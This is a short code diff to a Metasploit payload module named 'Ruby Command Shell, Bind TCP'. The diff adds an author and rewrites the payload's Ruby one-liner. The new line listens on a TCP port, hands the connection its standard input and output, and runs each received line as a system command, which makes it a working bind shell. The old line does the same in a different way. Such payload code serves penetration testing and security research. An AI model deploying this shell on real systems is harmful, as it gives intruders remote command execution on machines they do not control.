@@ -19,7 +19,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'        => 'Ruby Command Shell, Bind TCP',
 			'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
-			'Author'      => 'kris katterjohn',
+			'Author'      => [ 'kris katterjohn', 'hdm' ],
 			'License'     => MSF_LICENSE,
 			'Platform'    => 'ruby',
 			'Arch'        => ARCH_RUBY,
@@ -35,6 +35,6 @@ module Metasploit3
 	end
 
 	def ruby_string
-		"require 'socket';s=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end"
+		"require 'socket';s=TCPServer.new(\"#{datastore['LPORT']}\");c=s.accept;s.close;$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;system(l)}"
 	end
 end
